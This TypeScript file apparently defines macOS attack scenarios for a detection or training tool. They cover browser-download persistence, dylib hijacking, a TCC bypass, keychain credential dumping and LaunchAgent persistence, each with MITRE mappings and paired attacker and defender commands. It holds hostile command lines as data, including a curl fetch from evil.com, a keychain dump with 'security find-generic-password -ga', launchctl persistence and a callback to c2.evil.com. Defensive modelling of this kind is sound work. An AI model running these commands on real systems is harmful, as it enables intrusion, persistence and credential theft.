import { AttackScenario, EventCategory } from "../types";

export const ONTOLOGY_CATEGORIES: EventCategory[] = [
  'execution',
  'persistence',
  'file_system',
  'network',
  'privilege',
  'tcc',
  'sip',
  'xprotect',
  'credential_access',
  'discovery'
];

export const PREDEFINED_SCENARIOS: AttackScenario[] = [
  {
    id: 'browser-to-persistence',
    name: 'Browser to Persistence',
    description: 'Models a common initial access vector where a browser download leads to a LaunchAgent for persistence.',
    severity: 'high',
    steps: [
      {
        id: 'step-1',
        order: 1,
        description: 'Safari downloads a suspicious binary to ~/Downloads.',
        mitre_mapping: { tactic: 'Initial Access', technique_id: 'T1566.002', technique_name: 'Phishing: Spearphishing Link' },
        attacker_thought_before: "I've sent a spear-phishing link to the user. Hopefully, they download the 'Update.zip'.",
        attacker_command: "curl -L http://evil.com/Update.zip -o ~/Downloads/Update.zip",
        attacker_output: "Download complete. File saved to ~/Downloads/Update.zip",
        attacker_thought_after: "Successfully landed the payload. Now I just need the user to execute it.",
        defender_thought_before: "Monitoring for web-initiated downloads of executable types or archives that bypass Gatekeeper.",
        defender_command: "mdfind 'kMDItemFSName == \"Update.zip\"' | grep Downloads",
        defender_output: "/Users/user/Downloads/Update.zip found with quarantine bit set.",
        defender_thought_after: "Quarantine extended attributes detected. System will prompt user on execution.",
        expected_signals: [
          { event_type: 'file_create', category: 'file_system', description: 'File created in Downloads directory', process_name: 'com.apple.Safari' }
        ]
      },
      {
        id: 'step-2',
        order: 2,
        description: 'User executes the binary, which spawns a shell.',
        mitre_mapping: { tactic: 'Execution', technique_id: 'T1059.004', technique_name: 'Command and Scripting Interpreter: Unix Shell' },
        attacker_thought_before: "User has bypassed the prompt. I'm executing the second stage to gain interactive shell access.",
        attacker_command: "chmod +x ~/Downloads/Update/malicious_bin && ~/Downloads/Update/malicious_bin",
        attacker_output: "Process started. Shell spawned. PID: 6712",
        attacker_thought_after: "I have local execution. Time to secure my foothold.",
        defender_thought_before: "Detecting execution of unsigned binaries or processes spawning interactive shells from suspicious paths.",
        defender_command: "eslogger exec | grep Downloads",
        defender_output: "ES_EVENT_TYPE_NOTIFY_EXEC: malicious_bin (pid: 6712) spawned from /Users/user/Downloads/",
        defender_thought_after: "ALERT: Execution from Downloads directory detected. Flagging pid 6712 for telemetry escalation.",
        expected_signals: [
          { event_type: 'process_exec', category: 'execution', description: 'Execution of unsigned binary', command_line: './malicious_bin' }
        ]
      },
      {
        id: 'step-3',
        order: 3,
        description: 'Malicious process creates a LaunchAgent for persistence.',
        mitre_mapping: { tactic: 'Persistence', technique_id: 'T1543.001', technique_name: 'Create or Modify System Process: Launch Agent' },
        attacker_thought_before: "I need to survive a reboot. A LaunchAgent in the user's Library is the easiest path.",
        attacker_command: "mkdir -p ~/Library/LaunchAgents && echo '...' > ~/Library/LaunchAgents/com.malware.plist",
        attacker_output: "LaunchAgent plist written. Persistence configured for next login.",
        attacker_thought_after: "Foothold secured. I can now disconnect and wait for the system to cycle.",
        defender_thought_before: "Monitoring for file writes to the LaunchAgents directory by non-system processes.",
        defender_command: "eslogger write | grep LaunchAgents",
        defender_output: "ES_EVENT_TYPE_NOTIFY_WRITE: com.malware.plist (pid: 6712)",
        defender_thought_after: "CRITICAL: Malicious LaunchAgent detected. Adding to quarantine and blocking persistent execution.",
        expected_signals: [
          { event_type: 'file_write', category: 'persistence', description: 'Plist created in ~/Library/LaunchAgents', file_path: '~/Library/LaunchAgents/com.malware.plist' }
        ]
      }
    ]
  },
  {
    id: 'dylib-hijacking',
    name: 'Dylib Hijacking',
    description: 'Exploiting weak dylib loading paths to inject malicious code into a legitimate application.',
    severity: 'critical',
    steps: [
      {
        id: 'step-1',
        order: 1,
        description: 'Attacker identifies a vulnerable application with @rpath vulnerabilities.',
        mitre_mapping: { tactic: 'Discovery', technique_id: 'T1083', technique_name: 'File and Directory Discovery' },
        attacker_thought_before: "I need to find an application that loads dynamic libraries using relative paths (@rpath). This is a classic entry point for injection.",
        attacker_command: "find /Applications -name '*.app' -maxdepth 2 -exec otool -l {}/Contents/MacOS/* 2>/dev/null | grep -B 1 -A 10 LC_RPATH",
        attacker_output: "LC_RPATH\n  path @executable_path/../Frameworks (offset 12)\n--\nLC_LOAD_DYLIB\n  name @rpath/libSecurityLogic.dylib (offset 24)",
        attacker_thought_after: "Found 'SecureApp.app'. It loads 'libSecurityLogic.dylib' from a relative path. If I can place my own dylib there, I win.",
        defender_thought_before: "Baseline check: Monitoring system for unusual otool or nm usage on application bundles.",
        defender_command: "eslogger exec | grep otool",
        defender_output: "ES_EVENT_TYPE_NOTIFY_EXEC: otool (pid: 4521) triggered by user 'investigator'",
        defender_thought_after: "Standard developer behavior detected, but keeping an eye on the pid 4521 for subsequent file writes.",
        expected_signals: [
          { event_type: 'process_exec', category: 'execution', description: 'otool or nm used to inspect binary', process_name: 'otool' }
        ]
      },
      {
        id: 'step-2',
        order: 2,
        description: 'Malicious dylib is placed in the expected @rpath location.',
        mitre_mapping: { tactic: 'Persistence', technique_id: 'T1574.002', technique_name: 'Hijack Execution Flow: DLL Side-Loading' },
        attacker_thought_before: "Now I'll craft a malicious dylib that spawns a reverse shell on load and drop it into the Frameworks folder.",
        attacker_command: "cp /tmp/evil.dylib /Applications/SecureApp.app/Contents/Frameworks/libSecurityLogic.dylib",
        attacker_output: "File copied successfully. Permissions set to 755.",
        attacker_thought_after: "Persistence established. The legitimate application is now weaponized.",
        defender_thought_before: "Integrity check: Monitoring Writes to sensitive application bundle locations.",
        defender_command: "eslogger create | grep .dylib",
        defender_output: "ES_EVENT_TYPE_NOTIFY_CREATE: libSecurityLogic.dylib (path: /Applications/SecureApp.app/Contents/Frameworks/)",
        defender_thought_after: "Unusual dylib creation in a signed application bundle. This is highly suspicious.",
        expected_signals: [
          { event_type: 'file_create', category: 'file_system', description: 'Dylib dropped in application bundle', file_path: 'Contents/Frameworks/lib.dylib' }
        ]
      },
      {
        id: 'step-3',
        order: 3,
        description: 'Legitimate application loads the malicious dylib on startup.',
        mitre_mapping: { tactic: 'Execution', technique_id: 'T1574.002', technique_name: 'Hijack Execution Flow: DLL Side-Loading' },
        attacker_thought_before: "Time to wait for the user to open the app. The dynamic linker (dyld) will do the work for me.",
        attacker_command: "open /Applications/SecureApp.app",
        attacker_output: "Application initialized. Library loaded. Callback received: 192.168.1.50:4444",
        attacker_thought_after: "Payload successfully executed inside the context of a trusted Apple-signed process. TCC bypass highly likely.",
        defender_thought_before: "Monitoring for image loads from non-standard or recently modified paths.",
        defender_command: "eslogger mmap | grep SecureApp",
        defender_output: "ES_EVENT_TYPE_NOTIFY_MMAP: SecureApp (pid: 5102) loaded libSecurityLogic.dylib (UNSIGNED)",
        defender_thought_after: "ALERT: Signed binary loaded an unsigned library. Initiating process termination and quarantine.",
        expected_signals: [
          { event_type: 'image_load', category: 'execution', description: 'Malicious dylib loaded by signed process', process_name: 'TargetApp' }
        ]
      }
    ]
  },
  {
    id: 'tcc-bypass-env-var',
    name: 'TCC Bypass via Environment Variables',
    description: 'Attempting to subvert Transparency, Consent, and Control (TCC) by manipulating environment variables like HOME.',
    severity: 'high',
    steps: [
      {
        id: 'step-1',
        order: 1,
        description: 'Process sets a custom HOME environment variable to a world-writable directory.',
        mitre_mapping: { tactic: 'Defense Evasion', technique_id: 'T1564', technique_name: 'Hide Artifacts' },
        expected_signals: [
          { event_type: 'process_exec', category: 'execution', description: 'Exporting HOME variable', command_line: 'export HOME=/tmp/fake_home' }
        ]
      },
      {
        id: 'step-2',
        order: 2,
        description: 'Process attempts to access protected data (e.g., Contacts) using the fake HOME.',
        mitre_mapping: { tactic: 'Privilege Escalation', technique_id: 'T1548', technique_name: 'Abuse Privileges' },
        expected_signals: [
          { event_type: 'file_read', category: 'tcc', description: 'Access to TCC protected database', file_path: '~/Library/Application Support/com.apple.TCC/TCC.db' }
        ]
      }
    ]
  },
  {
    id: 'credential-dumping-security',
    name: 'Credential Dumping via security(1)',
    description: 'Using the built-in security utility to export keychain items or dump passwords.',
    severity: 'critical',
    steps: [
      {
        id: 'step-1',
        order: 1,
        description: 'Attacker uses security find-generic-password to extract secrets.',
        mitre_mapping: { tactic: 'Credential Access', technique_id: 'T1555.001', technique_name: 'Credentials from Password Stores: Keychain' },
        expected_signals: [
          { event_type: 'process_exec', category: 'credential_access', description: 'security find-generic-password execution', process_name: 'security', command_line: 'security find-generic-password -ga' }
        ]
      }
    ]
  },
  {
    id: 'malicious-launchagent-persistence',
    name: 'Malicious LaunchAgent Persistence',
    description: 'A dedicated scenario modeling the creation and execution of a malicious LaunchAgent for persistent access.',
    severity: 'high',
    steps: [
      {
        id: 'step-1',
        order: 1,
        description: 'Attacker drops a malicious payload in a hidden directory.',
        mitre_mapping: { tactic: 'Defense Evasion', technique_id: 'T1564.001', technique_name: 'Hide Artifacts: Hidden Files and Directories' },
        expected_signals: [
          { event_type: 'file_create', category: 'file_system', description: 'Payload dropped in ~/.local/.hidden/bin', file_path: '~/.local/.hidden/bin/updater' }
        ]
      },
      {
        id: 'step-2',
        order: 2,
        description: 'Adversary creates a LaunchAgent plist to execute the payload on user login.',
        mitre_mapping: { tactic: 'Persistence', technique_id: 'T1543.001', technique_name: 'Create or Modify System Process: Launch Agent' },
        expected_signals: [
          { event_type: 'file_write', category: 'persistence', description: 'Malicious plist written to LaunchAgents', file_path: '~/Library/LaunchAgents/com.system.update.plist', command_line: 'touch ~/Library/LaunchAgents/com.system.update.plist' }
        ]
      },
      {
        id: 'step-3',
        order: 3,
        description: 'LaunchAgent is loaded into the user session via launchctl.',
        mitre_mapping: { tactic: 'Persistence', technique_id: 'T1543.001', technique_name: 'Create or Modify System Process: Launch Agent' },
        expected_signals: [
          { event_type: 'process_exec', category: 'execution', description: 'launchctl load command executed', process_name: 'launchctl', command_line: 'launchctl load ~/Library/LaunchAgents/com.system.update.plist' }
        ]
      },
      {
        id: 'step-4',
        order: 4,
        description: 'The malicious agent executes and establishes a callback.',
        mitre_mapping: { tactic: 'Command and Control', technique_id: 'T1071.001', technique_name: 'Application Layer Protocol: Web Protocols' },
        expected_signals: [
          { event_type: 'network_connect', category: 'network', description: 'Outbound connection to C2 server', process_name: 'updater', command_line: './updater --connect c2.evil.com' }
        ]
      }
    ]
  }
];
